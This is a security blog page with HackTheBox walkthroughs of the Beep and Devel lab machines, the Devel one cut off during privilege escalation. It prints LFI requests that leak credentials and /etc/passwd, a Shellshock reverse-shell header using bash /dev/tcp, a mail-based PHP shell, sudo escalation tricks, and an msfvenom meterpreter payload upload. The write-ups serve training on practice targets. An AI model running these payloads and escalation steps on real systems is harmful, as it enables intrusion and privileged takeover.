<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="https://www.offsec.dev/favicon.png">
        <meta name="image" property="og:image" content="https://www.offsec.dev/ogmedia.png">
        <meta name="description" property="og:description" content="Security focused personal blog.">
        <meta name="author" content="Kiril Stefanov">
	<meta name="generator" content="Hugo 0.70.0" />
	
	<title>cve - | Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</title>
	<title>CodePen - Long shadow</title>

	
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
	<link href="https://www.offsec.dev/css/bootstrap.min.css" rel="stylesheet">
	<link href="https://www.offsec.dev/css/strange-case.css" rel="stylesheet">
	<link rel="stylesheet" href="https://www.offsec.dev/css/style.css">
	<link rel="stylesheet" href="https://www.offsec.dev/css/menu.css">
	

	
	
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

	
	<link href="https://www.offsec.dev/tags/cve/index.xml" rel="alternate" type="application/rss+xml" title="Kiril&#39;s Security Blog" />
</head>
<body class="scheme-slate">
	<canvas id="c"></canvas>


	<div class="container-fluid">
		<div class="row">
			<div class="col-sm-4 col-md-3 col-lg-3 sidebar">

			
	<div class="sidebar-content">
		
		<a href="https://www.offsec.dev"><h1>Kiril&#39;s Security Blog</h1></a>
		<p>| Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</p>

		
		<div class="sidebar-freetext">
			<p><a href="https://www.hackthebox.eu/profile/33863" target="_blank"><script src="https://www.hackthebox.eu/badge/33863"></script></a></p>
			<p>Nothing Is Private ...</p>
		</div>
		
		<div class="navbar-collapse" id="sidebar-menus">
			<ul class="nav-item dropdown ml-100" style="list-style-type: none;">
			  
			  <li class="dropup">
				
				<a href="https://www.offsec.dev/">Nothing like 127.0.0.1</a>
				
			  </li>
			  
			  <li class="dropup">
				
				<a href="https://www.offsec.dev/posts/about/">About Me</a>
				
			  </li>
			  
			  <li class="dropup">
				
				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Blog Posts <span class="caret"></span></a>
				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
				  
					<li><a href="https://www.offsec.dev/posts/ctf_post">Why CTF are awesome</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/ansi_art/">Ansi Art</a></li>
				  
				</ul>
				
			  </li>
			  
			  <li class="dropup">
				
				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Handy Resources <span class="caret"></span></a>
				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
				  
					<li><a href="https://www.offsec.dev/posts/enum/">Enumeration</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/shells/">Reverse Shells</a></li>
				  
				</ul>
				
			  </li>
			  
			  <li class="dropup">
				
				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">WriteUp section <span class="caret"></span></a>
				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
				  
					<li><a href="https://www.offsec.dev/posts/cache/">Access</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/aragog">Aragog</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/beep">Beep</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/devel">Devel</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame</a></li>
				  
				</ul>
				
			  </li>
			  
			</ul>
		</div>

		

		

		<p class="copyright">&copy; 2020. All rights reserved. </p>
		<p class="attr">Powered by <a href="http://gohugo.io">Hugo</a> &amp; <a href="https://github.com/ExchangeRate-API/strange-case">Strange Case</a> (inspired by <a href="https://github.com/poole/hyde">Hyde</a>).</p>

	</div>


			</div>
			<div class="col-sm-7 col-sm-offset-4 col-md-6 col-md-offset-3 col-lg-5 col-lg-offset-3 content">

				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/beep/">HackTheBox - Beep Walkthrough</a></h1>
						<span>Jul 19, 2019</span>
					</div>

					<p><img src="https://flamesec.com/images/beep/header.png" alt="Beep"></p>
<blockquote>
<p>Easy linux box with lost of paths to root - LFI with password reusage, LFI to RCE via mail, Shellshock and so on.</p>
</blockquote>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<h3 id="nmap">Nmap</h3>
<pre><code>root@kali:/vagrant/hackthebox/beep# nmap -sV -sC 10.10.10.7 -oN base_tcp.nmap
Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-07-17 20:25 EEST
Nmap scan report for 10.10.10.7
Host is up (0.033s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: EXPIRE(NEVER) APOP LOGIN-DELAY(0) TOP STLS RESP-CODES USER PIPELINING AUTH-RESP-CODE UIDL IMPLEMENTATION(Cyrus POP3 server v2)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ID LITERAL+ ATOMIC CATENATE CHILDREN X-NETSCAPE CONDSTORE LISTEXT URLAUTHA0001 IMAP4 LIST-SUBSCRIBED NO IDLE OK SORT=MODSEQ STARTTLS THREAD=REFERENCES MAILBOX-REFERRALS MULTIAPPEND IMAP4rev1 NAMESPACE ANNOTATEMORE RENAME SORT BINARY UNSELECT RIGHTS=kxte THREAD=ORDEREDSUBJECT ACL QUOTA UIDPLUS Completed
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2019-07-17T17:23:25+00:00; -4m57s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: -4m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 290.44 seconds

</code></pre><p>Additionally checking all ports I got some less known open ports:</p>
<pre><code>879/tcp   open  unknown
4190/tcp  open  sieve
4559/tcp  open  hylafax
5038/tcp  open  unknown
</code></pre><p>Let&rsquo;s get some more info on them:</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# nmap -sV -sC 10.10.10.7 -p 879,4190,4559,5038 -oN more_tcp.nmap
Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-07-18 13:14 EEST
Nmap scan report for beep.htb (10.10.10.7)
Host is up (0.036s latency).

PORT     STATE  SERVICE  VERSION
879/tcp  closed unknown
4190/tcp open   sieve    Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4559/tcp open   hylafax  HylaFAX 4.3.10
5038/tcp open   asterisk Asterisk Call Manager 1.1
Service Info: Host: localhost; OS: Unix
</code></pre><h3 id="services">Services</h3>
<h4 id="http">HTTP</h4>
<p>So I have a &ldquo;Elastix&rdquo; app - no idea what it is. Let&rsquo;s google a bit and see if there&rsquo;s something interesting.</p>
<p>Okay, so it&rsquo;s a PBX software - mailing, calls, etc. And dirbusting shows a looot of directories - roundcube, voicemail login, different dirs without indexes, etc.</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# gobuster dir -w /opt/wordlists/directory-medium.txt -u https://10.10.10.7 -k -t 50 -x php,txt,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7
[+] Threads:        50
[+] Wordlist:       /opt/wordlists/directory-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,zip
[+] Timeout:        10s
===============================================================
2019/07/17 21:37:19 Starting gobuster
===============================================================
/images (Status: 301)
/help (Status: 301)
/index.php (Status: 200)
/register.php (Status: 200)
/modules (Status: 301)
/themes (Status: 301)
/mail (Status: 301)
/admin (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/config.php (Status: 200)
/robots.txt (Status: 200)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
&lt;...&gt;
</code></pre><p>Also I have some vulns from searchsploit, but I need to check them if they can be used:</p>
<p>root@kali:/vagrant/hackthebox/beep# searchsploit elastix</p>
<hr>
<p>Exploit Title                                                                                                             |  Path
| (/opt/exploitdb/)</p>
<hr>
<p>Elastix - &lsquo;page&rsquo; Cross-Site Scripting                                                                                      | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                    | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                              | exploits/php/webapps/34942.txt
Elastix 2.2.0 - &lsquo;graph.php&rsquo; Local File Inclusion                                                                           | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                          | exploits/php/webapps/36305.txt
Elastix &lt; 2.5 - PHP Code Injection                                                                                         | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                     | exploits/php/webapps/18650.py</p>
<hr>
<h4 id="asterisk">Asterisk</h4>
<p>The voip service has quite the list of vulns, have to check if they are present on the version the server has.</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# searchsploit Asterisk
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                      |  Path
                                                                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Asterisk 'asterisk-addons' 1.2.7/1.4.3 - CDR_ADDON_MYSQL Module SQL Injection                                                       | exploits/linux/remote/30677.pl
Asterisk - 'ast_parse_digest()' Stack Buffer Overflow (PoC)                                                                         | exploits/linux/dos/18855.txt
Asterisk 0.x/1.0/1.2 Voicemail - Unauthorized Access                                                                                | exploits/cgi/webapps/26475.txt
Asterisk 1.0.12/1.2.12.1 - 'chan_skinny' Remote Heap Overflow (PoC)                                                                 | exploits/multiple/dos/2597.pl
Asterisk 1.2.15/1.4.0 - Remote Denial of Service                                                                                    | exploits/multiple/dos/3407.c
Asterisk 1.2.16/1.4.1 - SIP INVITE Remote Denial of Service                                                                         | exploits/multiple/dos/3566.pl
Asterisk 1.2.x - SIP channel driver / in pedantic mode Remote Crash                                                                 | exploits/multiple/dos/5749.pl
Asterisk 1.4 SIP T.38 SDP - Parsing Remote Stack Buffer Overflow (PoC) (1)                                                          | exploits/multiple/dos/29900.txt
Asterisk 1.4 SIP T.38 SDP - Parsing Remote Stack Buffer Overflow (PoC) (2)                                                          | exploits/multiple/dos/29901.txt
Asterisk 1.4.x - RTP Codec Payload Handling Multiple Buffer Overflow Vulnerabilities                                                | exploits/linux/dos/31440.txt
Asterisk 1.6 IAX - 'POKE' Requests Remote Denial of Service                                                                         | exploits/linux/dos/32095.pl
Asterisk 1.8.4.1 - SIP 'REGISTER' Request User Enumeration                                                                          | exploits/linux/remote/35801.txt
Asterisk 1.8.x - SIP INVITE Request User Enumeration                                                                                | exploits/multiple/remote/35685.txt
Asterisk 1.x - BYE Message Remote Denial of Service                                                                                 | exploits/multiple/dos/30974.txt
Asterisk 13.17.2 - 'chan_skinny' Remote Memory Corruption                                                                           | exploits/multiple/dos/43992.py
Asterisk &lt; 1.2.22/1.4.8 - IAX2 Channel Driver Remote Crash                                                                          | exploits/multiple/dos/4249.rb
Asterisk &lt; 1.2.22/1.4.8/2.2.1 - 'chan_skinny' Remote Denial of Service                                                              | exploits/multiple/dos/4196.c
Asterisk IAX2 - Attacked IAX Fuzzer Resource Exhaustion (Denial of Service)                                                         | exploits/multiple/dos/8940.pl
Asterisk PBX 0.7.x - Multiple Logging Format String Vulnerabilities                                                                 | exploits/linux/remote/24221.pl
Asterisk Recording Interface 0.7.15 - 'Audio.php' Information Disclosure                                                            | exploits/multiple/remote/27716.txt
Asterisk Recording Interface 0.7.15/0.10 - Multiple Vulnerabilities                                                                 | exploits/multiple/remote/34301.txt
Asterisk chan_pjsip 15.2.0 - 'INVITE' Denial of Service                                                                             | exploits/linux/dos/44181.py
Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service                                                                           | exploits/linux/dos/44183.py
Asterisk chan_pjsip 15.2.0 - 'SDP' Denial of Service                                                                                | exploits/linux/dos/44182.py
Asterisk chan_pjsip 15.2.0 - 'SUBSCRIBE' Stack Corruption                                                                           | exploits/linux/dos/44184.py
Asteriskguru Queue Statistics - 'warning' Cross-Site Scripting                                                                      | exploits/php/webapps/38375.txt
Fonality trixbox - 'asterisk_info.php' Directory Traversal                                                                          | exploits/php/webapps/39349.txt
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
</code></pre><h4 id="webmin">Webmin</h4>
<p>For webmin we have shellshock to try (hello cgi!)..</p>
<h2 id="2-initial-footholdlow-priv-access">2. Initial foothold/low priv access.</h2>
<p>The easiest way is to use the LFI vuln in <code>vtigercrm</code> - <code>exploits/php/webapps/37637.pl</code></p>
<pre><code>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&amp;module=Accounts&amp;action

HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 13:12:58 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 13779


AMPDBHOST=localhost
AMPDBENGINE=mysql
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE


AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 

FOPWEBROOT=/var/www/html/panel
FOPPASSWORD=jEhdIekWmdjE
ARI_ADMIN_USERNAME=admin

ARI_ADMIN_PASSWORD=jEhdIekWmdjE

AUTHTYPE=database

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asterisk
Sorry! Attempt to access restricted file.


https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash 
Sorry! Attempt to access restricted file.

https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&amp;module=Accounts&amp;action
&lt;...&gt; 
Sorry! Attempt to access restricted file.
</code></pre><p>Tried connecting to mysql with the credentials I found with the LFI, but no luck:</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# mysql -u asteriskuser -h 10.10.10.7 -p
Enter password: 
ERROR 1130 (HY000): Host '10.10.14.25' is not allowed to connect to this MySQL server
</code></pre><p>aand&hellip; trying the users from <code>/etc/passwd</code> with the passwords with ssh i get a match for <code>root</code>&hellip;:</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# ssh root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# cat /root/root.txt 
&lt;...&gt;

</code></pre><p>Damn password reusage :/</p>
<h4 id="shellshock">Shellshock</h4>
<p>I modified the <code>User-Agent</code> and used the /dev/tcp shell for a blind shellshock:</p>
<pre><code>GET / HTTP/1.1
Host: 10.10.10.7:10000
User-Agent: () { :;}; bash -i &gt;&amp; /dev/tcp/10.10.14.25/4848 0&gt;&amp;1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: ARI=r5hkca7mh8ln12n4la4o8neat1; PHPSESSID=737p48sdv47673q4m1l3mlppd7; elastixSession=3lj6vt1946kqiliifee0655ra2; testing=1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


root@kali:/vagrant/hackthebox/beep# nc -lvnp 4848
listening on [any] 4848 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.7] 58740
bash: no job control in this shell
[root@beep webmin]# id
uid=0(root) gid=0(root)
</code></pre><h4 id="smtp--lfi">SMTP + LFI</h4>
<p>Maybe the coolest way to pwn the box - ofc thanks to ippsec:</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# sendemail -t asterisk@localhost -o message-file=php-reverse-shell.php -u pwnd -s 10.10.10.7:25 -f flame_n@htb.eu
Jul 19 15:12:14 kali sendemail[11143]: Email was sent successfully!
</code></pre><p>Start a netcat listener, then open <code>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/spool/mail/asterisk%00&amp;module=Accounts&amp;action</code> aaand - profit!</p>
<pre><code>root@kali:/vagrant/hackthebox/beep# nc -lvnp 4949
listening on [any] 4949 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.7] 35358
Linux beep 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:23:01 EDT 2011 i686 athlon i386 GNU/Linux
 22:08:39 up  5:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
sh: no job control in this shell
sh-3.2$ 
</code></pre><h2 id="3-privilege-escalation">3. Privilege Escalation</h2>
<pre><code>User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
</code></pre><p>Okay&hellip; lots of tricks here&hellip; <code>nmap</code>, <code>chown</code>, <code>chmod</code>, etc.:</p>
<h4 id="chown">Chown</h4>
<pre><code>bash-3.2$ sudo chown asterisk:asterisk /etc/passwd
bash-3.2$ echo &quot;flame:sa/zAjIC0QWtk:0:0::/root/:/bin/bash&quot; &gt;&gt; /etc/passwd
echo &quot;flame:sa/zAjIC0QWtk:0:0::/root/:/bin/bash&quot; &gt;&gt; /etc/passwd

bash-3.2$ su - flame
su - flame
Password: flamen

[root@beep ~]# id
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><h4 id="nmap-1">Nmap</h4>
<pre><code>bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
nmap&gt; !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
</code></pre><h4 id="service">Service</h4>
<pre><code>bash-3.2$ sudo /sbin/service ../../../bin/bash
sudo /sbin/service ../../../bin/bash
[root@beep /]# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
</code></pre><p>And so on, check out the good folks at <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p>Overall cool machine - easy, but still great playground for testing different paths to root.</p>


				</div>
				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/devel/">HackTheBox - Devel Walkthrough</a></h1>
						<span>Jul 13, 2019</span>
					</div>

					<p><img src="https://flamesec.com/images/devel/header.png" alt="Devel"></p>
<blockquote>
<p>Time for the 3rd box. Another windows machine, this time - unpatched Windows 7 with&hellip; weird anonymous read/write access to the document root :) Again not the most interesting initial foothold, but it&rsquo;s a practice :)</p>
</blockquote>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<h3 id="nmap">Nmap</h3>
<pre><code>root@warmachine:/hackthebox/devel# nmap -sV -sC 10.10.10.5 -oN base_tcp.nmap
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-12 17:08 EEST
Nmap scan report for 10.10.10.5
Host is up (0.036s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre><p>Not much - ftp with anonymous + http.</p>
<h3 id="services">Services</h3>
<h4 id="ftp">FTP</h4>
<p>I have anonymous read/write permissions on what looks like the document root of the web server. Sweet!</p>
<h4 id="http">HTTP</h4>
<p>Just the default page for IIS Web server. Can confirm the content matches what I see in the ftp service.</p>
<h2 id="2-initial-footholdlow-priv-access">2. Initial foothold/low priv access.</h2>
<p>It looks like my best bet is to try a <code>msfvenom</code> payload for a reverse shell. And since it&rsquo;s a Windows machine I prefer to make it a meterpreter one :)</p>
<pre><code>root@warmachine:/hackthebox/devel/10.10.10.5# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4949  -f aspx &gt; flame_n.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2815 bytes
root@warmachine:/hackthebox/devel/10.10.10.5# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; put flame_n.aspx
local: flame_n.aspx remote: flame_n.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2851 bytes sent in 0.00 secs (7.9501 MB/s)
</code></pre><p>I&rsquo;m using the &ldquo;newer&rdquo; <code>aspx</code> (at least compared with asp :)) as an output format since the server is running IIS 7.5. After uploading the payload I visit http://10.10.10.5/flame_n.aspx and get a callback to my msfconsole listener</p>
<pre><code>meterpreter &gt; getuid 
Server username: IIS APPPOOL\Web
</code></pre><p>Let&rsquo;s check <code>systeminfo</code>:</p>
<pre><code>Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          16/7/2019, 12:57:08 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 28/7/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 535 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.368 MB
Virtual Memory: In Use:    679 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
</code></pre><p>Uh-oh.. looks like unpatched Windows 7 box, 32 bit. Running <code>PowerUp</code> with <code>Invoke-AllChecks</code> didn&rsquo;t yield anything interesting.</p>
<p>I&rsquo;ll check for some exploit suggestions with a script and with a metasploit module.</p>
<h2 id="3-privilege-escalation">3. Privilege Escalation</h2>
<h3 id="windows-exploit-suggester">Windows-Exploit-Suggester</h3>
<p>First I&rsquo;ll check with this script - <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a> . I need to provide a copy of the output of <code>systeminfo</code> from the Windows box and get the Microsoft patch db:</p>
